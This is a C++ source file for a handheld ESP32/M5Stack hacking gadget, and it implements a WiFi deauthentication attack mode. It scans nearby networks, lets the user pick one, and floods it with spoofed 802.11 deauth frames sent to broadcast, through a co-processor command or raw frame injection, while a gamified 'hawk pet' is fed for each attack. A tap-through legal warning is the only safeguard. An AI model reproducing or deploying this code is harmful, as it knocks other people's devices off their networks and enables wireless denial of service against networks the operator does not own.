// ============================================================
//  HeathenHawk Talon5 — modes/deauth.cpp
//  WiFi deauthentication — authorized use only
// ============================================================

#include "../../pins.h"
#include "../display/display_driver.h"
#include "../hawk/hawk_pet.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "../comms/comms_manager.h"

#define MODE_NAME "Deauth"
#define STATUS_H  64
#define MAX_NETS  50
#define ROW_H     100
#define HEADER_H  120

struct DeauthNet { char ssid[33]; uint8_t bssid[6]; char bssidStr[18]; int8_t rssi; int channel; };
static DeauthNet nets[MAX_NETS];
static int16_t   netCount    = 0;
static int16_t   selectedIdx = 0;
static bool      attacking   = false;
static uint32_t  framesSent  = 0;
static bool      needRedraw  = true;

void scanNets() {
    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks(false, true);
    netCount = 0;
    for (int i = 0; i < n && netCount < MAX_NETS; i++) {
        String ssid = WiFi.SSID(i);
        strlcpy(nets[netCount].ssid, ssid.c_str(), sizeof(nets[0].ssid));
        memcpy(nets[netCount].bssid, WiFi.BSSID(i), 6);
        uint8_t* b = nets[netCount].bssid;
        snprintf(nets[netCount].bssidStr, sizeof(nets[0].bssidStr),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 b[0],b[1],b[2],b[3],b[4],b[5]);
        nets[netCount].rssi    = WiFi.RSSI(i);
        nets[netCount].channel = WiFi.channel(i);
        netCount++;
    }
    WiFi.scanDelete();
    needRedraw = true;
}

void sendDeauth(const DeauthNet& net) {
    uint8_t frame[26] = {
        0xC0,0x00,              // Frame control: deauth
        0x00,0x00,              // Duration
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,  // Destination: broadcast
        net.bssid[0],net.bssid[1],net.bssid[2],
        net.bssid[3],net.bssid[4],net.bssid[5],  // Source: BSSID
        net.bssid[0],net.bssid[1],net.bssid[2],
        net.bssid[3],net.bssid[4],net.bssid[5],  // BSSID
        0x00,0x00,              // Sequence
        0x07,0x00               // Reason: Class 3 frame
    };
    // Send via C6 co-processor (handles raw 802.11 frames)
    if (Comms::c6Available()) {
        StaticJsonDocument<128> doc;
        JsonObject params = doc.to<JsonObject>();
        params["bssid"] = net.ssid;
        params["channel"] = net.channel;
        char bssidStr[18];
        snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 net.bssid[0],net.bssid[1],net.bssid[2],
                 net.bssid[3],net.bssid[4],net.bssid[5]);
        params["bssid"] = bssidStr;
        Comms::sendCommand(0, CMD_WIFI_DEAUTH, params);
    } else {
        // Fallback: direct attempt (may not work via hosted driver)
        esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    }
}

bool showConsent() {
    Display::clear(HH_DARK);
    Display::drawCard(40, 60, Display::width()-80, 600,
                      "!! Legal Warning !!", HH_RED);
    Display::setTextColor(HH_WHITE, HH_DARKCARD);
    Display::setTextSize(3.0f);
    Display::setCursor(60, 140);
    Display::print("Deauth attacks are ILLEGAL");
    Display::setCursor(60, 200);
    Display::print("without written permission.");
    Display::setCursor(60, 280);
    Display::print("Only use on networks you");
    Display::setCursor(60, 340);
    Display::print("own or are authorized to test.");

    Display::fillRoundRect(60, 440, Display::width()-120, 100, 20, HH_RED);
    Display::setTextColor(HH_WHITE, HH_RED);
    Display::setTextSize(3.2f);
    Display::setCursor(80, 475);
    Display::print("I have permission");

    Display::fillRoundRect(60, 560, Display::width()-120, 100, 20, HH_GRAY);
    Display::setTextColor(HH_WHITE, HH_GRAY);
    Display::setCursor(80, 595);
    Display::print("Cancel");

    while (true) {
        m5::touch_point_t tp[1];
        if (M5.Lcd.getTouchRaw(tp, 1) > 0) {
            while (M5.Lcd.getTouchRaw(tp, 1) > 0) delay(10);
            if (tp[0].y >= 440 && tp[0].y <= 540) return true;
            if (tp[0].y >= 560) return false;
        }
        delay(30);
    }
}

void renderNetList() {
    Display::fillRect(0, STATUS_H, Display::width(),
                      Display::height()-STATUS_H, HH_DARK);
    Display::drawStatusBar(MODE_NAME, false, false, false, 100);

    // Legal warning bar
    Display::fillRect(0, STATUS_H, Display::width(), 40, HH_RED);
    Display::setTextColor(HH_WHITE, HH_RED);
    Display::setTextSize(2.2f);
    Display::setCursor(20, STATUS_H+10);
    Display::print("AUTHORIZED USE ONLY");

    Display::fillRect(0, STATUS_H+40, Display::width(), 80, HH_DARKCARD);
    Display::setTextColor(HH_WHITE, HH_DARKCARD);
    Display::setTextSize(3.0f);
    Display::setCursor(20, STATUS_H+55);
    char hdr[32]; snprintf(hdr,sizeof(hdr),"%d networks", netCount);
    Display::print(hdr);

    // Scan button
    Display::fillRoundRect(Display::width()-300, STATUS_H+46, 280, 68, 14, HH_GREEN);
    Display::setTextColor(HH_WHITE, HH_GREEN);
    Display::setTextSize(2.8f);
    Display::setCursor(Display::width()-280, STATUS_H+62);
    Display::print("SCAN");

    if (netCount == 0) {
        Display::setTextColor(HH_GRAY, HH_DARK);
        Display::setTextSize(3.0f);
        Display::setCursor(40, Display::height()/2);
        Display::print("Tap SCAN to find networks");
        needRedraw = false;
        return;
    }

    int32_t y = STATUS_H + 120;
    for (int16_t i = 0; i < netCount && y < Display::height()-130; i++) {
        bool sel = (i == selectedIdx);
        Display::fillRect(0, y, Display::width(), ROW_H,
                          sel ? HH_RED : HH_DARKCARD);
        Display::drawLine(0, y+ROW_H-1, Display::width(), y+ROW_H-1, HH_DARK);
        Display::setTextColor(HH_WHITE, sel ? HH_RED : HH_DARKCARD);
        Display::setTextSize(3.0f);
        Display::setCursor(20, y+12);
        Display::print(strlen(nets[i].ssid)>0 ? nets[i].ssid : "[Hidden]");
        Display::setTextColor(sel ? HH_WHITE : HH_GRAY, sel ? HH_RED : HH_DARKCARD);
        Display::setTextSize(2.2f);
        Display::setCursor(20, y+54);
        char det[48]; snprintf(det,sizeof(det),"Ch%d  %ddBm  %s",
                               nets[i].channel,nets[i].rssi,nets[i].bssidStr);
        Display::print(det);
        y += ROW_H;
    }

    // Attack button
    Display::fillRoundRect(40, Display::height()-120,
                           Display::width()-80, 100, 20, HH_RED);
    Display::setTextColor(HH_WHITE, HH_RED);
    Display::setTextSize(3.5f);
    Display::setCursor(80, Display::height()-90);
    Display::print("DEAUTH SELECTED");
    needRedraw = false;
}

void renderAttack() {
    Display::fillRect(0, STATUS_H, Display::width(),
                      Display::height()-STATUS_H, HH_DARK);
    Display::drawStatusBar("ATTACKING", false, false, false, 100);
    Display::fillRect(0, STATUS_H, Display::width(), 40, HH_RED);
    Display::setTextColor(HH_WHITE, HH_RED);
    Display::setTextSize(2.2f);
    Display::setCursor(20, STATUS_H+10);
    Display::print("!! AUTHORIZED USE ONLY !!");

    Display::setTextColor(HH_RED, HH_DARK);
    Display::setTextSize(7.0f);
    Display::setCursor(40, STATUS_H+80);
    Display::print("DEAUTH");

    DeauthNet& t = nets[selectedIdx];
    Display::setTextColor(HH_WHITE, HH_DARK);
    Display::setTextSize(3.0f);
    Display::setCursor(20, STATUS_H+280);
    Display::printf("Target: %s", t.ssid[0] ? t.ssid : "[Hidden]");
    Display::setCursor(20, STATUS_H+340);
    Display::printf("BSSID: %s", t.bssidStr);
    Display::setCursor(20, STATUS_H+400);
    Display::printf("Ch: %d", t.channel);

    Display::setTextColor(HH_AMBER, HH_DARK);
    Display::setTextSize(6.0f);
    Display::setCursor(20, STATUS_H+480);
    char buf[16]; snprintf(buf,sizeof(buf),"%lu",framesSent);
    Display::print(buf);
    Display::setTextColor(HH_GRAY, HH_DARK);
    Display::setTextSize(2.8f);
    Display::setCursor(20, STATUS_H+580);
    Display::print("frames sent");

    Display::fillRoundRect(40, Display::height()-130,
                           400, 100, 20, HH_GRAY);
    Display::setTextColor(HH_WHITE, HH_GRAY);
    Display::setTextSize(3.5f);
    Display::setCursor(80, Display::height()-100);
    Display::print("STOP");
}

void mode_deauth() {
    netCount=0; selectedIdx=0; attacking=false;
    framesSent=0; needRedraw=true;
    memset(nets,0,sizeof(nets));

    if (!showConsent()) return;

    WiFi.mode(WIFI_AP);
    renderNetList();

    while (!attacking) {
        M5.update();
        m5::touch_point_t tp[1];
        int num = M5.Lcd.getTouchRaw(tp, 1);
        static bool wasDown = false;
        bool tapped = (num>0) && !wasDown;
        wasDown = (num>0);

        if (tapped) {
            if (tp[0].x < 40) { WiFi.mode(WIFI_OFF); return; }
            // Scan button
            if (tp[0].y >= STATUS_H+46 && tp[0].y <= STATUS_H+114 &&
                tp[0].x >= Display::width()-310) {
                scanNets();
                needRedraw = true;
            }
            // Network rows
            else if (tp[0].y >= STATUS_H+120 &&
                     tp[0].y < Display::height()-130) {
                int16_t idx = (tp[0].y - STATUS_H - 120) / ROW_H;
                if (idx < netCount) { selectedIdx=idx; needRedraw=true; }
            }
            // Attack button
            else if (tp[0].y >= Display::height()-130) {
                if (netCount > 0) attacking = true;
            }
            while (M5.Lcd.getTouchRaw(tp, 1) > 0) delay(10);
        }

        if (needRedraw) renderNetList();
        HawkPet::tick();
        delay(10);
    }

    // Attack loop
    renderAttack();
    uint32_t lastRender = 0;

    while (attacking) {
        M5.update();
        sendDeauth(nets[selectedIdx]);
        sendDeauth(nets[selectedIdx]);
        framesSent += 2;
        HawkPet::feed(FEED_DEAUTH, 1);

        m5::touch_point_t tp[1];
        if (M5.Lcd.getTouchRaw(tp, 1) > 0 &&
            tp[0].y > Display::height()-140) {
            while (M5.Lcd.getTouchRaw(tp, 1) > 0) delay(10);
            attacking = false;
        }

        if (millis()-lastRender > 500) { lastRender=millis(); renderAttack(); }
        delay(10);
    }

    WiFi.mode(WIFI_OFF);
    char msg[32]; snprintf(msg,sizeof(msg),"%lu frames sent",framesSent);
    Display::showAlert("Stopped", msg, HH_GRAY, 2000);
}
